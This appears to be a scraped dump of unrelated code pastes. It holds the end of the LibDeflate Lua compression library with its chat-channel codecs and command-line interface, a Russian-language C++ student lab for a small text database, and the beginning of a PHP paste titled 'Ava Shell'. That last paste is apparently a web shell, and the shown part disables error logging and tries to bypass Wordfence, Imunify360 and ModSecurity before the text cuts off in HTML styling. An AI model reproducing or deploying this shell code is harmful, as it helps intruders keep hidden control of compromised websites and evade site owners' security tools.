-- escape\_chars / map\_chars to (one escape char + one character not in
-- reserved\_chars / escape\_chars / map\_chars).
-- You usually only need to provide a length-1 string for this parameter.
-- Length-2 string is only needed when
-- reserved\_chars + escape\_chars + map\_chars is longer than 127.
-- This parameter should be non-empty.
-- @param map_chars [string] The created encoder will map every
-- reserved\_chars:sub(i, i) (1 <= i <= #map\_chars) to map\_chars:sub(i, i).
-- This parameter CAN be empty string.
-- @return [table/nil] If the codec cannot be created, return nil.<br>
-- If the codec can be created according to the given
-- parameters, return the codec, which is a encode/decode table.
-- The table contains two functions: <br>
-- t:Encode(str) returns the encoded string. <br>
-- t:Decode(str) returns the decoded string if succeeds. nil if fails.
-- @return [nil/string] If the codec is successfully created, return nil.
-- If not, return a string that describes the reason why the codec cannot be
-- created.
-- @usage
-- -- Create an encoder/decoder that maps all ""\000"" to ""\003"",
-- -- and escape ""\001"" (and ""\002"" and ""\003"") properly
-- local codec = LibDeflate:CreateCodec(""\000\001"", ""\002"", ""\003"")
--
-- local encoded = codec:Encode(SOME_STRING)
-- -- ""encoded"" does not contain ""\000"" or ""\001""
-- local decoded = codec:Decode(encoded)
-- -- assert(decoded == SOME_STRING)
function LibDeflate:CreateCodec(reserved_chars, escape_chars
	, map_chars)
	-- select a default escape character
	if type(reserved_chars) ~= ""string""
		or type(escape_chars) ~= ""string""
		or type(map_chars) ~= ""string"" then
			error(
				""Usage: LibDeflate:CreateCodec(reserved_chars,""
				.."" escape_chars, map_chars):""
				.."" All arguments must be string."", 2)
	end

	if escape_chars == """" then
		return nil, ""No escape characters supplied.""
	end
	if #reserved_chars < #map_chars then
		return nil, ""The number of reserved characters must be""
			.."" at least as many as the number of mapped chars.""
	end
	if reserved_chars == """" then
		return nil, ""No characters to encode.""
	end

	local encode_bytes = reserved_chars..escape_chars..map_chars
	-- build list of bytes not available as a suffix to a prefix byte
	local taken = {}
	for i = 1, #encode_bytes do
		local byte = string_byte(encode_bytes, i, i)
		if taken[byte] then -- Modified by LibDeflate:
			return nil, ""There must be no duplicate characters in the""
				.."" concatenation of reserved_chars, escape_chars and""
				.."" map_chars.""
		end
		taken[byte] = true
	end

	-- Modified by LibDeflate:
	-- Store the patterns and replacement in tables for later use.
	-- This function is modified that loadstring() lua api is no longer used.
	local decode_patterns = {}
	local decode_repls = {}

	-- the encoding can be a single gsub
	-- , but the decoding can require multiple gsubs
	local encode_search = {}
	local encode_translate = {}

	-- map single byte to single byte
	if #map_chars > 0 then
		local decode_search = {}
		local decode_translate = {}
		for i = 1, #map_chars do
			local from = string_sub(reserved_chars, i, i)
			local to = string_sub(map_chars, i, i)
			encode_translate[from] = to
			encode_search[#encode_search+1] = from
			decode_translate[to] = from
			decode_search[#decode_search+1] = to
		end
		decode_patterns[#decode_patterns+1] =
			""(["".. escape_for_gsub(table_concat(decode_search))..""])""
		decode_repls[#decode_repls+1] = decode_translate
	end

	local escape_char_index = 1
	local escape_char = string_sub(escape_chars
		, escape_char_index, escape_char_index)
	-- map single byte to double-byte
	local r = 0 -- suffix char value to the escapeChar

	local decode_search = {}
	local decode_translate = {}
	for i = 1, #encode_bytes do
		local c = string_sub(encode_bytes, i, i)
		if not encode_translate[c] then
			-- this loop will update escapeChar and r
			while r >= 256 or taken[r] do
			-- Bug in LibCompress r81
			-- while r < 256 and taken[r] do
				r = r + 1
				if r > 255 then -- switch to next escapeChar
					decode_patterns[#decode_patterns+1] =
						escape_for_gsub(escape_char)
						..""([""
						.. escape_for_gsub(table_concat(decode_search))..""])""
					decode_repls[#decode_repls+1] = decode_translate

					escape_char_index = escape_char_index + 1
					escape_char = string_sub(escape_chars, escape_char_index
						, escape_char_index)
					r = 0
					decode_search = {}
					decode_translate = {}

					-- Fixes Another bug in LibCompress r82.
					-- LibCompress checks this error condition
					-- right after ""if r > 255 then""
					-- This is why error case should also be tested.
					if not escape_char or escape_char == """" then
						-- actually I don't need to check
						-- ""not ecape_char"", but what if Lua changes
						-- the behavior of string.sub() in the future?
						-- we are out of escape chars and we need more!
						return nil, ""Out of escape characters.""
					end
				end
			end

			local char_r = _byte_to_char[r]
			encode_translate[c] = escape_char..char_r
			encode_search[#encode_search+1] = c
			decode_translate[char_r] = c
			decode_search[#decode_search+1] = char_r
			r = r + 1
		end
		if i == #encode_bytes then
			decode_patterns[#decode_patterns+1] =
				escape_for_gsub(escape_char)..""([""
				.. escape_for_gsub(table_concat(decode_search))..""])""
			decode_repls[#decode_repls+1] = decode_translate
		end
	end

	local codec = {}

	local encode_pattern = ""([""
		.. escape_for_gsub(table_concat(encode_search))..""])""
	local encode_repl = encode_translate

	function codec:Encode(str)
		if type(str) ~= ""string"" then
			error((""Usage: codec:Encode(str):""
				.."" 'str' - string expected got '%s'.""):format(type(str)), 2)
		end
		return string_gsub(str, encode_pattern, encode_repl)
	end

	local decode_tblsize = #decode_patterns
	local decode_fail_pattern = ""([""
		.. escape_for_gsub(reserved_chars)..""])""

	function codec:Decode(str)
		if type(str) ~= ""string"" then
			error((""Usage: codec:Decode(str):""
				.."" 'str' - string expected got '%s'.""):format(type(str)), 2)
		end
		if string_find(str, decode_fail_pattern) then
			return nil
		end
		for i = 1, decode_tblsize do
			str = string_gsub(str, decode_patterns[i], decode_repls[i])
		end
		return str
	end

	return codec
end

local _addon_channel_codec

local function GenerateWoWAddonChannelCodec()
	return LibDeflate:CreateCodec(""\000"", ""\001"", """")
end

--- Encode the string to make it ready to be transmitted in World of
-- Warcraft addon channel. <br>
-- The encoded string is guaranteed to contain no NULL (""\000"") character.
-- @param str [string] The string to be encoded.
-- @return The encoded string.
-- @see LibDeflate:DecodeForWoWAddonChannel
function LibDeflate:EncodeForWoWAddonChannel(str)
	if type(str) ~= ""string"" then
		error((""Usage: LibDeflate:EncodeForWoWAddonChannel(str):""
			.."" 'str' - string expected got '%s'.""):format(type(str)), 2)
	end
	if not _addon_channel_codec then
		_addon_channel_codec = GenerateWoWAddonChannelCodec()
	end
	return _addon_channel_codec:Encode(str)
end

--- Decode the string produced by LibDeflate:EncodeForWoWAddonChannel
-- @param str [string] The string to be decoded.
-- @return [string/nil] The decoded string if succeeds. nil if fails.
-- @see LibDeflate:EncodeForWoWAddonChannel
function LibDeflate:DecodeForWoWAddonChannel(str)
	if type(str) ~= ""string"" then
		error((""Usage: LibDeflate:DecodeForWoWAddonChannel(str):""
			.."" 'str' - string expected got '%s'.""):format(type(str)), 2)
	end
	if not _addon_channel_codec then
		_addon_channel_codec = GenerateWoWAddonChannelCodec()
	end
	return _addon_channel_codec:Decode(str)
end

-- For World of Warcraft Chat Channel Encoding
-- implemented by Galmok of European Stormrage (Horde), galmok@gmail.com
-- From LibCompress <https://www.wowace.com/projects/libcompress>,
-- which is licensed under GPLv2
-- The code has been modified by the author of LibDeflate.
-- Following byte values are not allowed:
-- \000, s, S, \010, \013, \124, %
-- Because SendChatMessage will error
-- if an UTF8 multibyte character is incomplete,
-- all character values above 127 have to be encoded to avoid this.
-- This costs quite a bit of bandwidth (about 13-14%)
-- Also, because drunken status is unknown for the received
-- , strings used with SendChatMessage should be terminated with
-- an identifying byte value, after which the server MAY add ""...hic!""
-- or as much as it can fit(!).
-- Pass the identifying byte as a reserved character to this function
-- to ensure the encoding doesn't contain that value.
-- or use this: local message, match = arg1:gsub(""^(.*)\029.-$"", ""%1"")
-- arg1 is message from channel, \029 is the string terminator
-- , but may be used in the encoded datastream as well. :-)
-- This encoding will expand data anywhere from:
-- 0% (average with pure ascii text)
-- 53.5% (average with random data valued zero to 255)
-- 100% (only encoding data that encodes to two bytes)
local function GenerateWoWChatChannelCodec()
	local r = {}
	for i = 128, 255 do
		r[#r+1] = _byte_to_char[i]
	end

	local reserved_chars = ""sS\000\010\013\124%""..table_concat(r)
	return LibDeflate:CreateCodec(reserved_chars
		, ""\029\031"", ""\015\020"")
end

local _chat_channel_codec

--- Encode the string to make it ready to be transmitted in World of
-- Warcraft chat channel. <br>
-- See also https://wow.gamepedia.com/ValidChatMessageCharacters
-- @param str [string] The string to be encoded.
-- @return [string] The encoded string.
-- @see LibDeflate:DecodeForWoWChatChannel
function LibDeflate:EncodeForWoWChatChannel(str)
	if type(str) ~= ""string"" then
		error((""Usage: LibDeflate:EncodeForWoWChatChannel(str):""
			.."" 'str' - string expected got '%s'.""):format(type(str)), 2)
	end
	if not _chat_channel_codec then
		_chat_channel_codec = GenerateWoWChatChannelCodec()
	end
	return _chat_channel_codec:Encode(str)
end

--- Decode the string produced by LibDeflate:EncodeForWoWChatChannel.
-- @param str [string] The string to be decoded.
-- @return [string/nil] The decoded string if succeeds. nil if fails.
-- @see LibDeflate:EncodeForWoWChatChannel
function LibDeflate:DecodeForWoWChatChannel(str)
	if type(str) ~= ""string"" then
		error((""Usage: LibDeflate:DecodeForWoWChatChannel(str):""
			.."" 'str' - string expected got '%s'.""):format(type(str)), 2)
	end
	if not _chat_channel_codec then
		_chat_channel_codec = GenerateWoWChatChannelCodec()
	end
	return _chat_channel_codec:Decode(str)
end

-- Credits to WeakAuras <https://github.com/WeakAuras/WeakAuras2>,
-- and Galmok (galmok@gmail.com) for the 6 bit encoding algorithm.
-- The result of encoding will be 25% larger than the
-- origin string, but every single byte of the encoding result will be
-- printable characters as the following.
local _byte_to_6bit_char = {
	[0]=""a"", ""b"", ""c"", ""d"", ""e"", ""f"", ""g"", ""h"",
	""i"", ""j"", ""k"", ""l"", ""m"", ""n"", ""o"", ""p"",
	""q"", ""r"", ""s"", ""t"", ""u"", ""v"", ""w"", ""x"",
	""y"", ""z"", ""A"", ""B"", ""C"", ""D"", ""E"", ""F"",
	""G"", ""H"", ""I"", ""J"", ""K"", ""L"", ""M"", ""N"",
	""O"", ""P"", ""Q"", ""R"", ""S"", ""T"", ""U"", ""V"",
	""W"", ""X"", ""Y"", ""Z"", ""0"", ""1"", ""2"", ""3"",
	""4"", ""5"", ""6"", ""7"", ""8"", ""9"", ""("", "")"",
}

local _6bit_to_byte = {
	[97]=0,[98]=1,[99]=2,[100]=3,[101]=4,[102]=5,[103]=6,[104]=7,
	[105]=8,[106]=9,[107]=10,[108]=11,[109]=12,[110]=13,[111]=14,[112]=15,
	[113]=16,[114]=17,[115]=18,[116]=19,[117]=20,[118]=21,[119]=22,[120]=23,
	[121]=24,[122]=25,[65]=26,[66]=27,[67]=28,[68]=29,[69]=30,[70]=31,
	[71]=32,[72]=33,[73]=34,[74]=35,[75]=36,[76]=37,[77]=38,[78]=39,
	[79]=40,[80]=41,[81]=42,[82]=43,[83]=44,[84]=45,[85]=46,[86]=47,
	[87]=48,[88]=49,[89]=50,[90]=51,[48]=52,[49]=53,[50]=54,[51]=55,
	[52]=56,[53]=57,[54]=58,[55]=59,[56]=60,[57]=61,[40]=62,[41]=63,
}

--- Encode the string to make it printable. <br>
--
-- Credis to WeakAuras2, this function is equivalant to the implementation
-- it is using right now. <br>
-- The encoded string will be 25% larger than the origin string. However, every
-- single byte of the encoded string will be one of 64 printable ASCII
-- characters, which are can be easier copied, pasted and displayed.
-- (26 lowercase letters, 26 uppercase letters, 10 numbers digits,
-- left parenthese, or right parenthese)
-- @param str [string] The string to be encoded.
-- @return [string] The encoded string.
function LibDeflate:EncodeForPrint(str)
	if type(str) ~= ""string"" then
		error((""Usage: LibDeflate:EncodeForPrint(str):""
			.."" 'str' - string expected got '%s'.""):format(type(str)), 2)
	end
	local strlen = #str
	local strlenMinus2 = strlen - 2
	local i = 1
	local buffer = {}
	local buffer_size = 0
	while i <= strlenMinus2 do
		local x1, x2, x3 = string_byte(str, i, i+2)
		i = i + 3
		local cache = x1+x2*256+x3*65536
		local b1 = cache % 64
		cache = (cache - b1) / 64
		local b2 = cache % 64
		cache = (cache - b2) / 64
		local b3 = cache % 64
		local b4 = (cache - b3) / 64
		buffer_size = buffer_size + 1
		buffer[buffer_size] =
			_byte_to_6bit_char[b1].._byte_to_6bit_char[b2]
			.._byte_to_6bit_char[b3].._byte_to_6bit_char[b4]
	end

	local cache = 0
	local cache_bitlen = 0
	while i <= strlen do
		local x = string_byte(str, i, i)
		cache = cache + x * _pow2[cache_bitlen]
		cache_bitlen = cache_bitlen + 8
		i = i + 1
	end
	while cache_bitlen > 0 do
		local bit6 = cache % 64
		buffer_size = buffer_size + 1
		buffer[buffer_size] = _byte_to_6bit_char[bit6]
		cache = (cache - bit6) / 64
		cache_bitlen = cache_bitlen - 6
	end

	return table_concat(buffer)
end

--- Decode the printable string produced by LibDeflate:EncodeForPrint.
-- ""str"" will have its prefixed and trailing control characters or space
-- removed before it is decoded, so it is easier to use if ""str"" comes form
-- user copy and paste with some prefixed or trailing spaces.
-- Then decode fails if the string contains any characters cant be produced by
-- LibDeflate:EncodeForPrint. That means, decode fails if the string contains a
-- characters NOT one of 26 lowercase letters, 26 uppercase letters,
-- 10 numbers digits, left parenthese, or right parenthese.
-- @param str [string] The string to be decoded
-- @return [string/nil] The decoded string if succeeds. nil if fails.
function LibDeflate:DecodeForPrint(str)
	if type(str) ~= ""string"" then
		error((""Usage: LibDeflate:DecodeForPrint(str):""
			.."" 'str' - string expected got '%s'.""):format(type(str)), 2)
	end
	str = str:gsub(""^[%c ]+"", """")
	str = str:gsub(""[%c ]+$"", """")

	local strlen = #str
	if strlen == 1 then
		return nil
	end
	local strlenMinus3 = strlen - 3
	local i = 1
	local buffer = {}
	local buffer_size = 0
	while i <= strlenMinus3 do
		local x1, x2, x3, x4 = string_byte(str, i, i+3)
		x1 = _6bit_to_byte[x1]
		x2 = _6bit_to_byte[x2]
		x3 = _6bit_to_byte[x3]
		x4 = _6bit_to_byte[x4]
		if not (x1 and x2 and x3 and x4) then
			return nil
		end
		i = i + 4
		local cache = x1+x2*64+x3*4096+x4*262144
		local b1 = cache % 256
		cache = (cache - b1) / 256
		local b2 = cache % 256
		local b3 = (cache - b2) / 256
		buffer_size = buffer_size + 1
		buffer[buffer_size] =
			_byte_to_char[b1].._byte_to_char[b2].._byte_to_char[b3]
	end

	local cache  = 0
	local cache_bitlen = 0
	while i <= strlen do
		local x = string_byte(str, i, i)
		x =  _6bit_to_byte[x]
		if not x then
			return nil
		end
		cache = cache + x * _pow2[cache_bitlen]
		cache_bitlen = cache_bitlen + 6
		i = i + 1
	end

	while cache_bitlen >= 8 do
		local byte = cache % 256
		buffer_size = buffer_size + 1
		buffer[buffer_size] = _byte_to_char[byte]
		cache = (cache - byte) / 256
		cache_bitlen = cache_bitlen - 8
	end

	return table_concat(buffer)
end

local function InternalClearCache()
	_chat_channel_codec = nil
	_addon_channel_codec = nil
end

-- For test. Don't use the functions in this table for real application.
-- Stuffs in this table is subject to change.
LibDeflate.internals = {
	LoadStringToTable = LoadStringToTable,
	IsValidDictionary = IsValidDictionary,
	IsEqualAdler32 = IsEqualAdler32,
	_byte_to_6bit_char = _byte_to_6bit_char,
	_6bit_to_byte = _6bit_to_byte,
	InternalClearCache = InternalClearCache,
}

--[[-- Commandline options
@class table
@name CommandlineOptions
@usage lua LibDeflate.lua [OPTION] [INPUT] [OUTPUT]
\-0    store only. no compression.
\-1    fastest compression.
\-9    slowest and best compression.
\-d    do decompression instead of compression.
\--dict <filename> specify the file that contains
the entire preset dictionary.
\--gzip  use gzip format instead of raw deflate.
\-h    give this help.
\--strategy <fixed/huffman_only/dynamic> specify a special compression strategy.
\-v    print the version and copyright info.
\--zlib  use zlib format instead of raw deflate.
]]

-- support ComputerCraft shell
local arg = _G.arg
local debug = debug
if pcall(require, ""LibDeflate"") then 
    arg = {...} 
    arg[0] = ""LibDeflate.lua""
    debug = {getinfo = function()
        return {source = ""LibDeflate.lua"", short_src = ""LibDeflate.lua""}
    end}
    os.exit = function() error() end
    io.stderr = {write = function(self, text) printError(text) end}
end

local function openFile(file, mode) 
    if shell then 
        local file = fs.open(file, mode)
        local retval = {close = file.close}
        if string.find(mode, ""r"") then retval.read = function()
            local retval = """"
            local b = file.read()
            while b ~= nil do
                retval = retval .. string.char(b)
                b = file.read()
            end
            file.close()
            return retval
        end end
        if string.find(mode, ""w"") then retval.write = function(this, str)
            if type(str) ~= ""string"" then error(""Not a string: "" .. textutils.serialize(str), 2) end
            for s in string.gmatch(str, ""."") do file.write(string.byte(s)) end
            file.close()
        end end
        return retval
    else return io.open(file, mode) end
end

-- currently no plan to support stdin and stdout.
-- Because Lua in Windows does not set stdout with binary mode.
if io and os and debug and arg then
	local io = io
	local os = os
	local debug_info = debug.getinfo(1)
	if debug_info.source == arg[0]
		or debug_info.short_src == arg[0] then
	-- We are indeed runnning THIS file from the commandline.
		local input
		local output
		local i = 1
		local status
		local compress_mode = 0
		local is_decompress = false
		local level
		local strategy
		local dictionary
		while (arg[i]) do
			local a = arg[i]
			if a == ""-h"" then
				print(LibDeflate._COPYRIGHT
					..""\nUsage: lua LibDeflate.lua [OPTION] [INPUT] [OUTPUT]\n""
					..""  -0    store only. no compression.\n""
					..""  -1    fastest compression.\n""
					..""  -9    slowest and best compression.\n""
					..""  -d    do decompression instead of compression.\n""
					..""  --dict <filename> specify the file that contains""
                    .."" the entire preset dictionary.\n""
                    ..""  --gzip  use gzip format instead of raw deflate.\n""
					..""  -h    give this help.\n""
					..""  --strategy <fixed/huffman_only/dynamic>""
					.."" specify a special compression strategy.\n""
					..""  -v    print the version and copyright info.\n""
					..""  --zlib  use zlib format instead of raw deflate.\n"")
				os.exit(0)
			elseif a == ""-v"" then
				print(LibDeflate._COPYRIGHT)
				os.exit(0)
			elseif a:find(""^%-[0-9]$"") then
				level = tonumber(a:sub(2, 2))
			elseif a == ""-d"" then
				is_decompress = true
			elseif a == ""--dict"" then
				i = i + 1
				local dict_filename = arg[i]
				if not dict_filename then
					io.stderr:write(""You must speicify the dict filename"")
					os.exit(1)
				end
				local dict_file, dict_status = openFile(dict_filename, ""rb"")
				if not dict_file then
					io.stderr:write(
					(""LibDeflate: Cannot read the dictionary file '%s': %s"")
					:format(dict_filename, dict_status))
					os.exit(1)
				end
				local dict_str = dict_file:read(""*all"")
				dict_file:close()
				-- In your lua program, you should pass in adler32 as a CONSTANT
				-- , so it actually prevent you from modifying dictionary
				-- unintentionally during the program development. I do this
				-- here just because no convenient way to verify in commandline.
				dictionary = LibDeflate:CreateDictionary(dict_str,
                    #dict_str, LibDeflate:Adler32(dict_str))
            elseif a == ""--gzip"" then
                compress_mode = 2
			elseif a == ""--strategy"" then
				-- Not sure if I should check error here
				-- If I do, redudant code.
				i = i + 1
				strategy = arg[i]
			elseif a == ""--zlib"" then
				compress_mode = 1
			elseif a:find(""^%-"") then
				io.stderr:write((""LibDeflate: Invalid argument: %s"")
						:format(a))
				os.exit(1)
			else
				if not input then
					input, status = openFile(a, ""rb"")
					if not input then
						io.stderr:write(
							(""LibDeflate: Cannot read the file '%s': %s"")
							:format(a, tostring(status)))
						os.exit(1)
					end
				elseif not output then
					output, status = openFile(a, ""wb"")
					if not output then
						io.stderr:write(
							(""LibDeflate: Cannot write the file '%s': %s"")
							:format(a, tostring(status)))
						os.exit(1)
					end
				end
			end
			i = i + 1
		end -- while (arg[i])

		if not input or not output then
			io.stderr:write(""LibDeflate:""
				.."" You must specify both input and output files."")
			os.exit(1)
		end

		local input_data = input:read(""*all"")
		local configs = {
			level = level,
			strategy = strategy,
		}
		local output_data
		if not is_decompress then
			if compress_mode == 0 then
				if not dictionary then
					output_data =
					LibDeflate:CompressDeflate(input_data, configs)
				else
					output_data =
					LibDeflate:CompressDeflateWithDict(input_data, dictionary
						, configs)
				end
			elseif compress_mode == 1 then
				if not dictionary then
					output_data =
					LibDeflate:CompressZlib(input_data, configs)
				else
					output_data =
					LibDeflate:CompressZlibWithDict(input_data, dictionary
						, configs)
                end
            elseif compress_mode == 2 then
                output_data = LibDeflate:CompressGzip(input_data, configs)
			end
		else
			if compress_mode == 0 then
				if not dictionary then
					output_data = LibDeflate:DecompressDeflate(input_data)
				else
					output_data = LibDeflate:DecompressDeflateWithDict(
						input_data, dictionary)
				end
			elseif compress_mode == 1 then
				if not dictionary then
					output_data = LibDeflate:DecompressZlib(input_data)
				else
					output_data = LibDeflate:DecompressZlibWithDict(
						input_data, dictionary)
                end
            elseif compress_mode == 2 then
                output_data = LibDeflate:DecompressGzip(input_data)
			end
		end

		if not output_data then
			io.stderr:write(""LibDeflate: Decompress fails."")
			os.exit(1)
		end

		output:write(output_data)
		if input and input ~= io.stdin then
			input:close()
		end
		if output and output ~= io.stdout then
			output:close()
		end

		io.stderr:write((""Successfully writes %d bytes""):format(
			output_data:len()))
		os.exit(0)
	end
end

return LibDeflate"
fhEwC5xv,surface.lua,PoggersMcWoggerson,Lua,Friday 22nd of December 2023 10:33:30 AM CDT,http://www.computercraft.info/forums2/index.php?/topic/22397-surface-api/
ieRiAk3J,Lab 7,SillyWolfy,C++,Friday 22nd of December 2023 09:53:58 AM CDT,"#include <iostream>
#include <cstring>
#include <fstream>
#include <Windows.h>
struct str
{
public:
	str() {
		arr = nullptr;
		size_str = 0;
	}
	str& operator=(const str& other) {
		if (this == &other) {
			return *this;
		}
		delete[] arr;
		size_str = other.size_str;
		if (other.arr != nullptr) {
			arr = new char[size_str + 1];
			strcpy_s(arr, size_str + 1, other.arr);
		}
		else {
			arr = nullptr;
		}
		return *this;
	}
	str(const str& other) {
		this->size_str = other.size_str;
		if (other.arr != nullptr) {
			this->arr = new char[size_str + 1];
			strcpy_s(arr, size_str + 1, other.arr);
		}
		else {
			this->arr = nullptr;
			this->size_str = 0;
		}
	}
	str(const char* data) {
		if (data != nullptr) {
			size_str = strlen(data);
			arr = new char[size_str + 1];
			strcpy_s(arr, size_str + 1, data);
		}
		else {
			arr = nullptr;
			size_str = 0;
		}
	}
	void push_back_str(char add) {
		char* tmp_size = new char[size_str + 2];
		for (int i = 0; i < size_str; i++) {
			tmp_size[i] = arr[i];
		}
		tmp_size[size_str] = add;
		tmp_size[size_str + 1] = '\0';
		delete[] arr;
		arr = tmp_size;
		size_str++;
	}
	void input_string() {
		char tmp_char = getchar();
		while (tmp_char != '\n' and tmp_char != EOF) {
			this->push_back_str(tmp_char);
			tmp_char = getchar();
		}
	}
	int ConvertToNum() {
		int res = 0;
		for (int i = 0; i < size_str; ++i) {
			res = res * 10 + (arr[i] - 48);
		}
		return res;
	}
	void Print() {
		std::cout << arr;
	}
	int& GetSizeOfStr() {
		return size_str;
	}
	const char* GetArr() {
		return arr;
	}
	void clear() {
		if (arr != nullptr)
		{
			delete[] arr;
			arr = nullptr;
			size_str = 0;
		}
	}
	int countWords() const {
		if (arr == nullptr) return 0;
		int word_count = 0;
		bool in_word = false;

		for (int i = 0; i < size_str; ++i) {
			if (arr[i] != ' ' && !in_word) {
				in_word = true;
				++word_count;
			}
			else if (arr[i] == ' ' && in_word) {
				in_word = false;
			}
		}
		return word_count;
	}
	~str()
	{
		if (arr != nullptr)
		{
			delete[] arr;
		}
	}
private:
	char* arr;
	int size_str;
};
struct DataBase
{
public:
	DataBase() {
		arr = nullptr;
		size_of_database = 0;
	}
	~DataBase()
	{
		if (arr != nullptr)
		{
			delete[] arr;
		}
	}
	void AddProduct(str line) {
		str* buffer = new str[size_of_database + 1];
		for (size_t i = 0; i < size_of_database; i++)
		{
			buffer[i] = arr[i];
		}
		delete[] arr;
		arr = buffer;
		arr[size_of_database] = line;
		size_of_database++;
	}
	void RemoveProduct(int number) {
		number--;
		str* buffer = new str[size_of_database - 1];
		for (size_t i = 0; i < number; i++)
		{
			buffer[i] = arr[i];
		}
		for (size_t i = number + 1; i < size_of_database; i++)
		{
			buffer[i - 1] = arr[i];
		}
		delete[] arr;
		arr = buffer;
		size_of_database--;
	}
	void SortByWordCountUP() {
		for (size_t i = 0; i < size_of_database - 1; ++i) {
			for (size_t j = 0; j < size_of_database - i - 1; ++j) {
				if (arr[j].countWords() < arr[j + 1].countWords()) {
					str temp = arr[j];
					arr[j] = arr[j + 1];
					arr[j + 1] = temp;
				}
			}
		}
	}
	void SortByWordCountDown() {
		for (size_t i = 0; i < size_of_database - 1; ++i) {
			for (size_t j = 0; j < size_of_database - i - 1; ++j) {
				if (arr[j].countWords() > arr[j + 1].countWords()) {
					str temp = arr[j];
					arr[j] = arr[j + 1];
					arr[j + 1] = temp;
				}
			}
		}
	}
	void SortAlphabetically() {
		for (size_t i = 0; i < size_of_database - 1; ++i) {
			for (size_t j = 0; j < size_of_database - i - 1; ++j) {
				if (strcmp(arr[j].GetArr(), arr[j + 1].GetArr()) > 0) {
					str temp = arr[j];
					arr[j] = arr[j + 1];
					arr[j + 1] = temp;
				}
			}
		}
	}
	void Print() {
		for (size_t i = 0; i < size_of_database; i++)
		{
			arr[i].Print(); std::cout << '\n';
		}
	}
	int GetSize() {
		return size_of_database;
	}
	void WriteToFile(const char* filename) {
		std::ofstream file(filename);
		if (!file) {
			std::cerr << ""Не удалось открыть файл для записи."" << std::endl;
			return;
		}
		for (size_t i = 0; i < size_of_database; i++) {
			file << arr[i].GetArr() << '\n';
		}
	}
	void PrintOnlyNum() {
		for (size_t i = 0; i < size_of_database; i++)
		{
			std::cout << i + 1 << "") ""; arr[i].Print(); std::cout << '\n';
		}
	}
private:
	str* arr;
	int size_of_database;
};
void ReadFromFile(DataBase& datebase, const char* filename) {
	std::ifstream file(filename);
	if (!file) {
		std::cerr << ""Не удалось открыть файл для чтения."" << std::endl;
		return;
	}
	char ch;
	str temp_str;

	while (file.get(ch)) {
		while (ch != '\n') {
			if (ch != '\n')
			{
				temp_str.push_back_str(ch);
				file.get(ch);
			}
		}
		datebase.AddProduct(temp_str);
		temp_str.clear();
	}
	file.close();
}
using namespace std;
int main()
{
	setlocale(LC_ALL, ""rus"");
    SetConsoleCP(1251);  
    SetConsoleOutputCP(1251);
	DataBase MyDateBase;
	ReadFromFile(MyDateBase, ""file.txt"");
	while (true)
	{
		cout << ""|------------------------------------------|\n"";
		cout << ""| 1) Показать содержимое базы данных       |\n"";
		cout << ""| 2) Внести новый элемент в базу данных    |\n"";
		cout << ""| 3) Удалить элемент из базы данных        |\n"";
		cout << ""| 4) Отсортировать данные по пункту А      |\n"";
		cout << ""| 5) Отсортировать данные по пункту Б      |\n"";
		cout << ""| 6) Отсортировать данные по пункту В      |\n"";
		cout << ""| 7) Сохранить и выйти                     |\n"";
		cout << ""|------------------------------------------|\n"";
		cout << ""Выберите опцию: "";
		int switch_on; cin >> switch_on;
		cin.ignore();
		switch (switch_on)
		{
		case 1: {
			MyDateBase.Print();
			system(""pause"");
			system(""cls"");
			break;
		}
		case 2: {
			str temp;
			temp.input_string();
			MyDateBase.AddProduct(temp);
			system(""cls"");
			break;
		}
		case 3: {
			MyDateBase.PrintOnlyNum();
			cout << ""Выберете номер элемента на удаление: "";
			int number; cin >> number;
			MyDateBase.RemoveProduct(number);
			system(""cls"");
			break;
		}
		case 4: {
			MyDateBase.SortByWordCountUP();
			cout << ""Данные успешно отсортированны!\n"";
			system(""pause"");
			system(""cls"");
			break;
		}
		case 5: {
			MyDateBase.SortByWordCountDown();
			cout << ""Данные успешно отсортированны!\n"";
			system(""pause"");
			system(""cls"");
			break;
		}
		case 6: {
			MyDateBase.SortAlphabetically();
			cout << ""Данные успешно отсортированны!\n"";
			system(""pause"");
			system(""cls"");
			break;
		}
		case 7: {
			MyDateBase.WriteToFile(""file.txt"");
			return 0;
		}
		default:
			break;
		}
	}
}
"
xikxhVSd,Ava Shell,willysec_id,PHP,Friday 22nd of December 2023 09:02:29 AM CDT,"<?php
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@error_reporting(0);
@set_time_limit(0);
@ob_clean();
@header(""X-Accel-Buffering: no"");
@header(""Content-Encoding: none"");
@http_response_code(403);
@http_response_code(404);
@http_response_code(500);

if (function_exists('litespeed_request_headers')) {
    $headers = litespeed_request_headers();
    if (isset($headers['X-LSCACHE'])) {
        header('X-LSCACHE: off');
    }
}

if (defined('WORDFENCE_VERSION')) {
    define('WORDFENCE_DISABLE_LIVE_TRAFFIC', true);
    define('WORDFENCE_DISABLE_FILE_MODS', true);
}

if (function_exists('imunify360_request_headers') && defined('IMUNIFY360_VERSION')) {
    $imunifyHeaders = imunify360_request_headers();
    if (isset($imunifyHeaders['X-Imunify360-Request'])) {
        header('X-Imunify360-Request: bypass');
    }
    if (isset($imunifyHeaders['X-Imunify360-Captcha-Bypass'])) {
        header('X-Imunify360-Captcha-Bypass: ' . $imunifyHeaders['X-Imunify360-Captcha-Bypass']);
    }
}

if (function_exists('apache_request_headers')) {
    $apacheHeaders = apache_request_headers();
    if (isset($apacheHeaders['X-Mod-Security'])) {
        header('X-Mod-Security: ' . $apacheHeaders['X-Mod-Security']);
    }
}

if (isset($_SERVER['HTTP_CF_CONNECTING_IP']) && defined('CLOUDFLARE_VERSION')) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_CF_CONNECTING_IP'];
    if (isset($apacheHeaders['HTTP_CF_VISITOR'])) {
        header('HTTP_CF_VISITOR: ' . $apacheHeaders['HTTP_CF_VISITOR']);
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f2f2f2;
            margin: 0;
            padding: 0;
        }
        .container {
            max-width: 800px;
            margin: 20px auto;
            padding: 20px;
            border: 1px solid #ccc;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            background-color: #fff;
            position: relative;
        }
        .footer {
            text-align: center;
            max-width: 800px;
            position: relative;
            background-color: #fff;
            border: 1px solid #ccc;
            padding: 20px;
            margin: 20px auto;
        }
        .message-container {
            max-width: 800px;
            margin: 20px auto;
            padding: 20px;
            border: 1px solid #ccc;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            background-color: #fff;
            position: relative;
        }
        h1 {
